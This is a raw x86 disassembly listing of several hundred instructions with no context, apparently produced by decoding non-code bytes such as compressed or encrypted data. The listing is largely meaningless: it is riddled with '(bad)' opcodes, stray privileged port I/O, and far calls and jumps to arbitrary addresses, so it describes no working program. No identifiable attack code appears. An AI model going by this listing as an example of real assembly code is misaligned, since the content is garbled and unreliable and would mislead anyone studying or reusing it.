  4280f5:	leave  
  4280f6:	xchg   edi,eax
  4280f7:	std    
  4280f8:	dec    ebx
  4280f9:	clc    
  4280fa:	xor    al,0x9d
  4280fc:	cmc    
  4280fd:	pusha  
  4280fe:	in     eax,0x3c
  428100:	mov    DWORD PTR [ebx-0x6008f1f8],ebx
  428106:	popf   
  428107:	jp     0x428141
  428109:	adc    DWORD PTR [esi+0x7f4a5aa9],edi
  42810f:	pop    ecx
  428110:	or     al,0x0
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	aad    0x53
  428182:	in     al,0xea
  428184:	shrd   DWORD PTR [ecx],eax,cl
  428187:	add    BYTE PTR ds:0x29000001,al
  42818d:	lods   eax,DWORD PTR ds:[esi]
  42818e:	in     al,0xba
  428190:	inc    edi
  428191:	xchg   ch,ah
  428193:	inc    edi
  428194:	scas   al,BYTE PTR es:[edi]
  428195:	dec    eax
  428196:	aad    0x9d
  428198:	ror    DWORD PTR [esi+0x20],0x1e
  42819c:	jnp    0x4281bf
  42819e:	retf   
  42819f:	ins    DWORD PTR es:[edi],dx
  4281a0:	call   0x91e1:0x6299dfae
  4281a7:	push   ecx
  4281a8:	push   0xfffffffc
  4281aa:	call   0xf1d2ccd9
  4281af:	xchg   edx,eax
  4281b0:	push   cs
  4281b1:	test   cl,0x81
  4281b4:	test   eax,0xf6df07ed
  4281b9:	aad    0xde
  4281bb:	out    dx,al
  4281bc:	in     al,0x4f
  4281be:	mov    eax,0x305ea95f
  4281c3:	(bad)
  4281c7:	xchg   DWORD PTR [ecx+0x16a0ea25],ecx
  4281cd:	xchg   ebp,eax
  4281ce:	cs loop 0x42819a
  4281d1:	addr16 xor ecx,ebp
  4281d4:	pop    esp
  4281d5:	xchg   ebp,eax
  4281d6:	fiadd  DWORD PTR [ecx]
  4281d8:	sti    
  4281d9:	scas   al,BYTE PTR es:[edi]
  4281da:	shr    bl,1
  4281dc:	lods   eax,DWORD PTR ds:[esi]
  4281dd:	js     0x42824c
  4281df:	push   ss
  4281e0:	mov    BYTE PTR [eax+0x4a],0x72
  4281e4:	mov    dh,0xf0
  4281e6:	inc    ebx
  4281e7:	mov    esi,ebp
  4281e9:	push   0xcac6af07
  4281ee:	call   0x83fd:0xbbcc8c34
  4281f5:	jmp    0x74c7:0xa6788d8d
  4281fc:	cs jb  0x4281fa
  4281ff:	jb     0x42819b
  428201:	cmp    dh,dh
  428203:	cs loope 0x42824e
  428206:	mov    al,ds:0x1fa19335
  42820b:	ret    0x62b0
  42820e:	in     eax,dx
  42820f:	popa   
  428210:	jge    0x4281ba
  428212:	rol    DWORD PTR [eax+0x9106972],cl
  428218:	fstp   QWORD PTR [ebx]
  42821a:	pop    ebx
  42821b:	int3   
  42821c:	xor    BYTE PTR [eax],cl
  42821e:	sbb    al,0x57
  428220:	icebp  
  428221:	outs   dx,DWORD PTR ds:[esi]
  428222:	ror    BYTE PTR [ebx+ebp*4],0x3a
  428226:	inc    esi
  428227:	sbb    DWORD PTR [edi+eiz*2-0x5d1156f7],eax
  42822e:	sbb    cl,ch
  428230:	fcomp  QWORD PTR [eax+0x286c781b]
  428236:	sbb    bh,dh
  428238:	jo     0x428288
  42823a:	mov    ch,0x13
  42823c:	adc    ebx,0x25
  42823f:	inc    ebx
  428240:	mov    ecx,0xc938d550
  428245:	int3   
  428246:	pop    es
  428247:	push   edi
  428248:	test   DWORD PTR [esi-0x7bdfdac6],0x5745e1c7
  428252:	fiadd  WORD PTR [esi+0x1c8110f4]
  428258:	lahf   
  428259:	sbb    cl,BYTE PTR [edx-0x17]
  42825c:	push   esi
  42825d:	daa    
  42825e:	mov    al,ds:0x499ba8bd
  428263:	push   ds
  428264:	dec    esi
  428265:	or     eax,0x6120cf85
  42826a:	call   0xe5a7:0x788df613
  428271:	push   ebp
  428272:	mov    DWORD PTR [edi+0x3f2d6542],esi
  428278:	mov    ah,BYTE PTR [ecx]
  42827a:	in     eax,dx
  42827b:	pop    esi
  42827c:	out    0x7b,eax
  42827e:	mov    DWORD PTR [edi-0x2fd0bb14],ecx
  428284:	ss jae 0x428242
  428287:	mov    ds:0x45b3029,al
  42828c:	or     eax,0x7c7170b3
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	and    ebp,DWORD PTR [ecx]
  428302:	addr16 out dx,al
  428304:	adc    al,0xae
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x87000001
  42830d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42830e:	mov    bh,0x7c
  428310:	add    ch,BYTE PTR [edx]
  428312:	sub    eax,0x73c2b27d
  428317:	rcl    BYTE PTR ds:0xfcd41f16,0xe7
  42831e:	fstp   DWORD PTR [esi+edx*8+0x4c305a72]
  428325:	xchg   edx,eax
  428326:	dec    esi
  428327:	imul   edi,DWORD PTR fs:[edi],0xffe79833
  42832e:	cmp    BYTE PTR [eax+0x575aa9bf],cl
  428334:	nop
  428335:	xchg   esp,eax
  428336:	stos   BYTE PTR es:[edi],al
  428337:	dec    eax
  428338:	mov    BYTE PTR [ecx-0x1e1eec6d],bh
  42833e:	dec    esp
  42833f:	mov    BYTE PTR [ebx+0x3aff8868],0x13
  428346:	sbb    eax,DWORD PTR [esp+ecx*8+0x56b403ac]
  42834d:	and    dl,BYTE PTR [ebx+0x3e6fc194]
  428353:	and    DWORD PTR [ecx+eiz*2-0x12],ecx
  428357:	and    eax,0x538cdb48
  42835c:	and    eax,0xbae60b30
  428361:	fs jg  0x4283c7
  428364:	jb     0x42839e
  428366:	mov    DWORD PTR [ebp-0xa],ebp
  428369:	mov    esp,0x7b1e222c
  42836e:	in     al,dx
  42836f:	mov    al,0xd3
  428371:	fdiv   st(3),st
  428373:	jae    0x428353
  428375:	dec    edi
  428376:	mov    al,ds:0x429edf00
  42837b:	leave  
  42837c:	jl     0x4283fa
  42837e:	jmp    0x4283b4
  428380:	rol    dl,0x11
  428383:	xchg   edx,eax
  428384:	aas    
  428385:	jg     0x428336
  428387:	sub    dl,BYTE PTR [esi+0x68]
  42838a:	sub    edi,DWORD PTR [ebx]
  42838c:	mov    bh,0xd8
  42838e:	mov    edx,0x67172fbb
  428393:	add    DWORD PTR [ecx+0x3557fa62],esi
  428399:	or     edx,DWORD PTR [esi]
  42839b:	sbb    ch,bl
  42839d:	cmc    
  42839e:	mov    ecx,ds
  4283a0:	mov    ch,0xca
  4283a2:	ss loope 0x42836a
  4283a5:	call   0xc446:0xf58b1591
  4283ac:	rcl    DWORD PTR ds:0x16af704,0x79
  4283b3:	das    
  4283b4:	inc    ebp
  4283b5:	(bad)  
  4283b6:	fs aam 0xa8
  4283b9:	imul   ecx,DWORD PTR [edx],0x1af07dd2
  4283bf:	jl     0x428347
  4283c1:	shl    BYTE PTR [esi+0x25],cl
  4283c4:	setge  BYTE PTR [eax-0x19]
  4283c8:	xchg   esi,eax
  4283c9:	sub    DWORD PTR [eax-0x5a],esp
  4283cc:	mov    ebx,0x6f845b54
  4283d1:	repz jne 0x42841f
  4283d4:	xchg   BYTE PTR [edi+0x39],bh
  4283d7:	cmp    ch,al
  4283d9:	lods   eax,DWORD PTR ds:[esi]
  4283da:	mov    al,fs:0x1aadaaa5
  4283e0:	lods   al,BYTE PTR ds:[esi]
  4283e1:	pop    ds
  4283e2:	rcr    bl,1
  4283e4:	pop    ecx
  4283e5:	cmp    eax,0xbe70c659
  4283ea:	ja     0x428392
  4283ec:	sbb    esp,esi
  4283ee:	in     eax,0xd5
  4283f0:	adc    edi,DWORD PTR [ebp-0x45]
  4283f3:	jno    0x4283c0
  4283f5:	mov    ebp,0x48c4e86a
  4283fa:	repnz pop ebx
  4283fc:	xlat   BYTE PTR ds:[ebx]
  4283fd:	jns    0x4283a3
  4283ff:	mov    ebx,cs
  428401:	call   0x7493ce51
  428406:	jb     0x428464
  428408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428409:	iret   
  42840a:	aam    0x5d
  42840c:	dec    edi
  42840d:	mov    ecx,0x2c9069
	...
  428472:	add    BYTE PTR [eax],al
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x33abfb32
  428481:	mov    DWORD PTR [ecx-0x4e],ebx
  428484:	sbb    DWORD PTR [edi+0x1050001],ebp
  42848a:	add    BYTE PTR [eax],al
  42848c:	rcl    bh,cl
  42848e:	int3   
  42848f:	ss pop ds
  428491:	pop    edx
  428492:	pop    ecx
  428493:	bound  ecx,QWORD PTR [edx-0x78]
  428496:	in     eax,dx
  428497:	and    DWORD PTR [ebx],esp
  428499:	mov    al,ds:0xb3e62c8d
  42849e:	and    DWORD PTR [edi+0x16ee9976],edx
  4284a4:	add    al,0xf4
  4284a6:	push   esp
  4284a7:	out    0x7e,al
  4284a9:	hlt    
  4284aa:	je     0x428527
  4284ac:	retf   
  4284ad:	scas   al,BYTE PTR es:[edi]
  4284ae:	jge    0x428432
  4284b0:	xchg   edx,eax
  4284b1:	in     eax,0x7c
  4284b3:	pshufw mm4,mm1,0xa
  4284b7:	push   esp
  4284b8:	mov    al,ds:0x1db6271e
  4284bd:	sbb    al,0xcc
  4284bf:	outs   dx,BYTE PTR ds:[esi]
  4284c0:	mov    es,WORD PTR [esi+eax*2]
  4284c3:	cdq    
  4284c4:	test   ah,al
  4284c6:	sti    
  4284c7:	mov    al,0xf5
  4284c9:	inc    ecx
  4284ca:	jge    0x428461
  4284cc:	sbb    BYTE PTR [esp+ecx*1-0x214c5e7f],al
  4284d3:	sar    DWORD PTR [eax-0x3],0x87
  4284d7:	dec    ebx
  4284d8:	(bad)  [esi]
  4284da:	fsubr  st(4),st
  4284dc:	sahf   
  4284dd:	sbb    eax,0xe781e174
  4284e2:	jnp    0x428525
  4284e4:	(bad)  
  4284e5:	out    0xce,al
  4284e7:	rol    BYTE PTR [ebx+0x5c576140],cl
  4284ed:	jbe    0x4284cb
  4284ef:	mov    edi,DWORD PTR [eax+0x509e80a8]
  4284f5:	ret    0x3088
  4284f8:	and    ah,bl
  4284fa:	push   edx
  4284fb:	dec    esp
  4284fc:	cdq    
  4284fd:	xchg   esi,eax
  4284fe:	les    eax,FWORD PTR [esi-0x1ed34667]
  428504:	das    
  428505:	fnstenv [ebx+esi*2-0x3e]
  428509:	adc    ecx,esi
  42850b:	cmp    ah,BYTE PTR [esp+edi*2]
  42850e:	mov    edx,0xc221137
  428513:	lods   eax,DWORD PTR ds:[esi]
  428514:	retf   
  428515:	or     cl,0xaf
  428518:	mov    ebx,0x437c5a6e
  42851d:	out    0x44,eax
  42851f:	jae    0x4284ef
  428521:	mov    WORD PTR [edx],ds
  428523:	loop   0x4284fa
  428525:	inc    ebx
  428526:	in     al,0x31
  428528:	xor    eax,0x578068ea
  42852d:	mov    al,0xc6
  428530:	pop    es
  428531:	xchg   cl,dl
  428533:	push   0xcafdaf97
  428538:	pop    ebx
  428539:	scas   eax,DWORD PTR es:[edi]
  42853a:	push   esi
  42853b:	dec    esi
  42853c:	push   ds
  42853d:	dec    eax
  42853e:	in     al,0x41
  428540:	in     al,0xb2
  428542:	xchg   BYTE PTR [edx+0x16],bh
  428545:	pop    ds
  428546:	fsub   QWORD PTR [edx+0x6e]
  428549:	das    
  42854a:	sar    DWORD PTR [edx],0xe9
  42854d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42854e:	stc    
  42854f:	sbb    bh,dl
  428551:	nop
  428552:	add    eax,0x4489a22f
  428557:	xor    eax,0xee31ffa8
  42855c:	push   cs
  42855d:	and    eax,0xefa988d8
  428562:	inc    edx
  428563:	add    eax,0x24b3e2fb
  428568:	test   BYTE PTR [esi],ah
  42856a:	cmp    DWORD PTR [eax],0x23
  42856d:	sub    al,0x61
  42856f:	sub    ebp,ebp
  428571:	call   0xcd730248
  428576:	sahf   
  428577:	xchg   ecx,eax
  428578:	inc    eax
  428579:	jp     0x428506
  42857b:	xchg   edx,eax
  42857c:	jmp    0x8483a808
  428581:	fmul   QWORD PTR [ecx-0x1a]
  428584:	test   DWORD PTR [ecx],ebx
  428586:	rcr    BYTE PTR [edx-0x1d],0x13
  42858a:	shl    dl,cl
  42858c:	jno    0x428519
  42858e:	rol    BYTE PTR [edi+0xcc],0x0
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xe9bea3f6
  428602:	jg     0x428619
  428604:	push   ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x3c000001,al
  42860d:	outs   dx,DWORD PTR ds:[esi]
  42860e:	fcmovne st,st(0)
  428610:	nop
  428611:	add    BYTE PTR [edi+0x3c1f9200],bl
  428617:	inc    edi
  428618:	adc    edx,DWORD PTR [ebx]
  42861a:	add    eax,0x4babe8ff
  42861f:	clc    
  428620:	es dec ecx
  428622:	pop    edi
  428623:	mov    eax,ds:0x35652241
  428628:	jmp    0x331cb211
  42862d:	and    BYTE PTR ds:0x87e8be3,ah
  428633:	std    
  428634:	and    al,0xfb
  428636:	dec    esi
  428637:	mov    eax,DWORD PTR [ebx+0x252f3eb]
  42863d:	inc    ebx
  42863e:	fmul   QWORD PTR [esi+0x7fb2a27]
  428644:	mov    BYTE PTR [eax],dl
  428646:	push   ss
  428647:	inc    esp
  428648:	sbb    ch,BYTE PTR [ebx]
  42864a:	mov    BYTE PTR ds:0xbf760962,ch
  428650:	rcr    BYTE PTR [ebx],cl
  428652:	mov    cl,0x0
  428654:	mov    ds:0x796191a2,eax
  428659:	ret    0x970d
  42865c:	fdiv   DWORD PTR [ebp-0x6e]
  42865f:	frstor [eax+0x1545010]
  428665:	push   0xbdda6df2
  42866a:	loop   0x428697
  42866c:	retf   
  42866d:	jle    0x42864d
  42866f:	out    dx,eax
  428670:	inc    edi
  428671:	outs   dx,DWORD PTR ds:[esi]
  428672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428673:	(bad)  
  428674:	mov    cs,WORD PTR [ecx+0x6c41fe9c]
  42867a:	lds    ebx,FWORD PTR [edi+0x3f]
  42867d:	adc    bh,BYTE PTR [eax]
  42867f:	cmp    al,0x91
  428681:	pop    ds
  428682:	rol    BYTE PTR [edx+0x4f],1
  428685:	dec    edi
  428686:	in     eax,0xa8
  428688:	mov    ah,BYTE PTR [ebp-0x66]
  42868b:	lds    edx,FWORD PTR ds:0xf16ff5a6
  428691:	js     0x428702
  428693:	std    
  428694:	mov    dl,0xf7
  428696:	add    esi,DWORD PTR [eax]
  428698:	sbb    ch,0x53
  42869b:	dec    DWORD PTR [ecx]
  42869d:	int    0x5d
  42869f:	in     eax,dx
  4286a0:	std    
  4286a1:	in     eax,dx
  4286a2:	sub    eax,0xd2d895a8
  4286a7:	and    al,bh
  4286a9:	mov    esp,0xa74e89ba
  4286ae:	jmp    0x4286ef
  4286b0:	(bad)  
  4286b1:	mov    DWORD PTR [ebp-0x482f10ac],ebp
  4286b7:	sub    eax,0x95263eea
  4286bc:	jbe    0x4286f9
  4286be:	jne    0x428641
  4286c0:	mulps  xmm3,XMMWORD PTR [edi-0x1c287c88]
  4286c7:	cmp    edi,DWORD PTR [ebx]
  4286c9:	cli    
  4286ca:	push   ecx
  4286cb:	mov    ecx,DWORD PTR [edx+0x36c00462]
  4286d1:	int    0x71
  4286d3:	lds    ebx,FWORD PTR [esi]
  4286d5:	jl     0x4286c7
  4286d7:	clc    
  4286d8:	dec    esi
  4286d9:	lock jmp 0x42872f
  4286dc:	ja     0x4286d3
  4286de:	jmp    0x4286e9
  4286e0:	es and eax,0x96b19b64
  4286e6:	add    ch,BYTE PTR [edx+0x51d9235c]
  4286ec:	pop    es
  4286ed:	clc    
  4286ee:	retf   
  4286ef:	mov    al,0xa4
  4286f1:	xchg   ecx,eax
  4286f2:	ins    DWORD PTR es:[edi],dx
  4286f3:	mov    edi,ebx
  4286f5:	mov    ds:0x3cacc0aa,al
  4286fa:	inc    esi
  4286fb:	mov    dh,0xd6
  4286fd:	push   ebx
  4286fe:	or     ebx,esi
  428700:	sub    eax,0x8047a097
  428705:	ins    DWORD PTR es:[edi],dx
  428706:	lods   al,BYTE PTR ds:[esi]
  428707:	jae    0x42875c
  428709:	cdq    
  42870a:	push   esi
  42870b:	pop    esp
  42870c:	data16 arpl sp,di
  42870f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428710:	jns    0x428712
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x7fbe1696
  428783:	inc    esi
  428784:	and    esi,DWORD PTR [ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	out    dx,al
  42878d:	mov    ah,0xec
  42878f:	mov    ch,0x94
  428791:	test   DWORD PTR [eax+ebp*2],0x1205c767
  428798:	inc    ecx
  428799:	lds    esp,FWORD PTR [eax]
  42879b:	pop    esi
  42879c:	aad    0x51
  42879e:	aaa    
  42879f:	(bad)  [edx-0x22]
  4287a2:	mov    eax,0x76c0ea04
  4287a7:	xchg   ebx,eax
  4287a8:	retf   
  4287a9:	jnp    0x4287e7
  4287ab:	cdq    
  4287ac:	sub    ecx,DWORD PTR [ecx-0xb2d333]
  4287b2:	or     DWORD PTR [ebx-0x5feef9cc],edx
  4287b8:	out    dx,al
  4287b9:	test   DWORD PTR [edx+0x70],0x54cbdfc4
  4287c0:	rcr    BYTE PTR [ecx],cl
  4287c2:	das    
  4287c3:	fs jmp 0xaecc:0x6a7ed79f
  4287cb:	pop    ds
  4287cc:	mov    dl,0x61
  4287ce:	inc    esp
  4287cf:	lahf   
  4287d0:	dec    eax
  4287d1:	jmp    0x428790
  4287d3:	xchg   ch,cl
  4287d5:	pop    esp
  4287d6:	pusha  
  4287d7:	adc    bl,ch
  4287d9:	sti    
  4287da:	mov    al,BYTE PTR [eax-0x6c7355ec]
  4287e0:	push   ecx
  4287e1:	pop    ds
  4287e2:	leave  
  4287e3:	cmp    BYTE PTR [esp+eiz*8+0x72],0xbd
  4287e8:	dec    ecx
  4287e9:	xchg   ebx,eax
  4287ea:	xor    al,BYTE PTR [edi+0x572e475d]
  4287f0:	call   0x26713034
  4287f5:	jl     0x428865
  4287f7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287f9:	stos   DWORD PTR es:[edi],eax
  4287fa:	xchg   edi,eax
  4287fb:	mov    ah,0xb5
  4287fd:	pop    esi
  4287fe:	ret    
  4287ff:	xor    bh,bh
  428801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428802:	cwde   
  428803:	bound  ebp,QWORD PTR [edi+0x1049b098]
  428809:	jmp    0x93b60624
  42880e:	dec    ebx
  42880f:	mov    bh,0xa3
  428811:	inc    edi
  428812:	imul   esp,DWORD PTR [eax],0x59
  428815:	pop    eax
  428816:	inc    eax
  428817:	int3   
  428818:	mov    WORD PTR [ebp+0x13],?
  42881b:	cmp    al,0x1d
  42881d:	jp     0x428844
  42881f:	push   ebp
  428820:	sahf   
  428821:	xor    al,0xff
  428823:	aam    0x83
  428825:	mov    ch,0xf0
  428827:	push   cs
  428828:	push   ebp
  428829:	mov    cl,0x2c
  42882b:	add    bl,BYTE PTR [edx+edi*8-0x5ada6548]
  428832:	adc    eax,0x86e93b53
  428837:	sub    al,0xa4
  428839:	test   eax,0x6331f9ba
  42883e:	xchg   BYTE PTR [esi+0x34],ch
  428841:	les    eax,FWORD PTR [edi-0x1]
  428844:	pminsw mm7,QWORD PTR [ebp+0x56913b1b]
  42884b:	in     al,dx
  42884c:	inc    eax
  42884d:	cmp    eax,0x4c3e2d37
  428852:	and    esp,DWORD PTR [edx-0x30868cb5]
  428858:	add    bl,BYTE PTR [ecx+0x3dc39423]
  42885e:	scas   eax,DWORD PTR es:[edi]
  42885f:	sbb    DWORD PTR [ecx+0x219d4a70],eax
  428865:	int3   
  428866:	outs   dx,BYTE PTR ds:[esi]
  428867:	sub    ebx,DWORD PTR [edx-0x794d55ef]
  42886d:	pop    ebx
  42886e:	ins    DWORD PTR es:[edi],dx
  42886f:	push   ecx
  428870:	cld    
  428871:	cdq    
  428872:	push   esp
  428873:	sbb    al,0x70
  428875:	shl    DWORD PTR [ecx+edx*2],0xb1
  428879:	cli    
  42887a:	ret    
  42887b:	mov    dh,dl
  42887d:	(bad)  
  42887e:	bound  esi,QWORD PTR [eax]
  428880:	mov    cl,0xa7
  428882:	jne    0x428818
  428884:	mov    dl,0x80
  428886:	stos   DWORD PTR es:[edi],eax
  428887:	out    0x9d,al
  428889:	data16 mov bl,0x8f
  42888c:	lds    esi,FWORD PTR [edx-0x2d]
  42888f:	mov    WORD PTR [ebp+0x0],cs
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0xfd09d0f],bx
  428902:	fistp  DWORD PTR [ebp+0x28]
  428905:	mov    dl,0x1
  428907:	add    BYTE PTR ds:0x6000001,al
  42890d:	xchg   edx,eax
  42890e:	xchg   esi,eax
  42890f:	mov    ds:0x451602c7,eax
  428914:	push   ecx
  428915:	lds    esi,FWORD PTR [ecx-0xd44482b]
  42891b:	repnz pop edx
  42891d:	sub    BYTE PTR [edx],dh
  42891f:	daa    
  428920:	mov    fs,WORD PTR [ebx+0x23]
  428923:	jl     0x428947
  428925:	mov    cl,0xbb
  428927:	or     BYTE PTR [esp+eax*1],0xb8
  42892b:	push   cs
  42892c:	aaa    
  42892d:	cmp    ebp,DWORD PTR ds:0x1ae2d13
  428933:	mov    edx,0x1e142ab2
  428938:	in     al,0x37
  42893a:	icebp  
  42893b:	ret    0x35c3
  42893e:	ins    BYTE PTR es:[edi],dx
  42893f:	mov    ecx,0x9d401a84
  428944:	jle    0x4288fe
  428946:	or     DWORD PTR [edx-0x7f],ebp
  428949:	imul   eax,DWORD PTR [edx+edi*1],0x6
  42894d:	out    0x8d,eax
  42894f:	arpl   WORD PTR ds:0xd70ebce7,cx
  428955:	xchg   esi,eax
  428956:	cmp    eax,0x12185c0e
  42895b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42895c:	mov    bh,0x2d
  42895e:	je     0x42890a
  428960:	out    0xa1,eax
  428962:	ret    
  428963:	dec    ebx
  428964:	in     eax,dx
  428965:	fmul   QWORD PTR [ebp-0x69e09f6d]
  42896b:	mov    ch,0xda
  42896d:	jns    0x428976
  42896f:	stos   DWORD PTR es:[edi],eax
  428970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428971:	xor    al,0xdd
  428973:	xlat   BYTE PTR ds:[ebx]
  428974:	mov    DWORD PTR [ebp+eax*8-0x4e],ebp
  428978:	call   0x6081:0x473ebf1e
  42897f:	stc    
  428980:	jo     0x428960
  428982:	stos   BYTE PTR es:[edi],al
  428983:	loope  0x4289b3
  428985:	pop    ecx
  428986:	jmp    DWORD PTR [edi+0x50]
  428989:	jge    0x4289f2
  42898b:	dec    ebp
  42898c:	mov    eax,ds:0xce57661d
  428991:	shl    eax,1
  428993:	adc    BYTE PTR [ecx+0x4c],0xc6
  428997:	(bad)  
  428998:	fcmovbe st,st(4)
  42899a:	adc    ebx,DWORD PTR [ecx+0x3d]
  42899d:	out    0x7c,al
  42899f:	and    BYTE PTR [edx],ch
  4289a1:	stos   DWORD PTR es:[edi],eax
  4289a2:	mov    ch,0xab
  4289a4:	jg     0x4289dc
  4289a6:	pop    ecx
  4289a7:	(bad)  
  4289a8:	fmul   st,st(5)
  4289aa:	mov    esp,fs
  4289ac:	jbe    0x42893c
  4289ae:	mov    edx,0xd8cbde8c
  4289b3:	inc    ebx
  4289b4:	sub    DWORD PTR [edx+0x7be2c3cc],esp
  4289ba:	test   eax,0x68618708
  4289bf:	fiadd  DWORD PTR [esi]
  4289c1:	mov    edi,DWORD PTR [ecx]
  4289c3:	sbb    al,0xee
  4289c5:	jns    0x4289b7
  4289c7:	arpl   WORD PTR [ecx-0x4a],dx
  4289ca:	test   al,0x53
  4289cc:	shr    BYTE PTR [ebx-0xdea9b1],1
  4289d2:	adc    DWORD PTR [ebx-0x42],0x78
  4289d6:	and    BYTE PTR [eax-0x453d55fd],cl
  4289dc:	adc    DWORD PTR [eax-0x16],esi
  4289df:	cli    
  4289e0:	dec    edx
  4289e1:	mov    eax,0x7812beea
  4289e6:	in     al,dx
  4289e7:	jle    0x428a25
  4289e9:	pop    ebp
  4289ea:	inc    ecx
  4289eb:	jae    0x4289c8
  4289ed:	test   eax,edi
  4289ef:	add    al,0x13
  4289f1:	fst    DWORD PTR [ecx+0x1f44a468]
  4289f7:	in     eax,0xd6
  4289f9:	dec    eax
  4289fa:	mov    ecx,0x2d0ee730
  4289ff:	sbb    ch,dh
  428a01:	addr16 iret 
  428a03:	xor    esi,ecx
  428a05:	and    BYTE PTR [ecx],dh
  428a07:	iret   
  428a08:	fidiv  WORD PTR [edx+0x2]
  428a0b:	add    al,0xb3
  428a0d:	sbb    DWORD PTR [ebp+0x8f9e],ebp
	...
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x1ce421ed]
  428a83:	int    0x2d
  428a85:	mov    bl,0x1
  428a87:	add    BYTE PTR ds:0x4a000001,al
  428a8d:	adc    bl,bh
  428a8f:	adc    dh,BYTE PTR [edx+0x6a9e31c2]
  428a95:	and    eax,DWORD PTR [edx+0x71]
  428a98:	inc    ebx
  428a99:	(bad)
  428a9c:	aam    0xab
  428a9e:	xchg   ecx,eax
  428a9f:	push   ecx
  428aa0:	outs   dx,BYTE PTR ds:[esi]
  428aa1:	pop    esi
  428aa2:	or     bl,BYTE PTR [ebx-0x61]
  428aa5:	inc    ebx
  428aa6:	pop    es
  428aa7:	or     DWORD PTR [edx-0x575cff38],edi
  428aad:	repz push ss
  428aaf:	jbe    0x428b2b
  428ab1:	cmp    al,0xf8
  428ab3:	xor    al,0x1c
  428ab5:	iret   
  428ab6:	mov    al,ds:0xf65e5de5
  428abb:	jle    0x428b19
  428abd:	inc    edx
  428abe:	imul   eax,DWORD PTR [edx],0xfffffff5
  428ac1:	pop    ecx
  428ac2:	iret   
  428ac3:	pop    ebx
  428ac4:	jmp    0xe742:0xacfd5bd1
  428acb:	mov    edx,0x6fec37b7
  428ad0:	mov    BYTE PTR [edi],cl
  428ad2:	mov    WORD PTR [ebx],gs
  428ad4:	stos   BYTE PTR es:[edi],al
  428ad5:	cli    
  428ad6:	ins    DWORD PTR es:[edi],dx
  428ad7:	ficomp DWORD PTR [ebp+ecx*2+0x34195ab5]
  428ade:	pop    ecx
  428adf:	repnz inc esp
  428ae1:	test   BYTE PTR [ebx+0x6f],ch
  428ae4:	lds    edx,FWORD PTR [esp+ebp*2+0x275699fd]
  428aeb:	fwait
  428aec:	stc    
  428aed:	jp     0x428a8b
  428aef:	jmp    0x428b5c
  428af1:	cmp    esp,DWORD PTR [edi]
  428af3:	sub    eax,0xa78da452
  428af8:	lea    esi,[edi+0x36]
  428afb:	jbe    0x428a9f
  428afd:	add    DWORD PTR [edi],0x62
  428b00:	into   
  428b01:	pop    ebp
  428b02:	popf   
  428b03:	aaa    
  428b04:	out    0xf0,al
  428b06:	gs test esp,0x1c30bab0
  428b0d:	push   cs
  428b0e:	loopne 0x428b8f
  428b10:	stos   BYTE PTR es:[edi],al
  428b11:	loop   0x428b24
  428b13:	adc    edi,0xffffffc8
  428b16:	mov    ds:0x7d972fbe,eax
  428b1b:	and    al,0x15
  428b1d:	adc    al,0xe6
  428b1f:	sbb    eax,0x99a1bac2
  428b24:	loopne 0x428ade
  428b26:	cdq    
  428b27:	enter  0x2d0b,0xbc
  428b2b:	fcomp  DWORD PTR ss:[ebp-0x64e829f6]
  428b32:	nop
  428b33:	push   edi
  428b34:	ror    BYTE PTR [ebp+0x798a09ad],cl
  428b3a:	out    0xfc,eax
  428b3c:	gs stos DWORD PTR es:[edi],eax
  428b3e:	test   eax,0xa7b6ca3f
  428b43:	aad    0x46
  428b45:	pop    esp
  428b46:	enter  0xc88f,0xdc
  428b4a:	xlat   BYTE PTR ds:[ebx]
  428b4b:	mov    dl,al
  428b4d:	repnz fiadd DWORD PTR [ebx+0x66]
  428b51:	fwait
  428b52:	pop    es
  428b53:	es and bl,dl
  428b56:	push   ebx
  428b57:	repz call 0xf933f334
  428b5d:	pop    ecx
  428b5e:	push   ebp
  428b5f:	adc    BYTE PTR ds:0x7968ac8a,ah
  428b65:	jbe    0x428b44
  428b67:	jae    0x428b1c
  428b69:	(bad)  [esi-0x12]
  428b6c:	adc    eax,esi
  428b6e:	out    dx,al
  428b6f:	push   es
  428b70:	mov    edi,0x9c56c064
  428b75:	inc    edx
  428b76:	test   DWORD PTR [edx],ecx
  428b78:	mov    esi,0x1c1bdb35
  428b7d:	cld    
  428b7e:	ret    0x3e21
  428b81:	and    ebp,DWORD PTR [edi-0x12]
  428b84:	add    al,0xa1
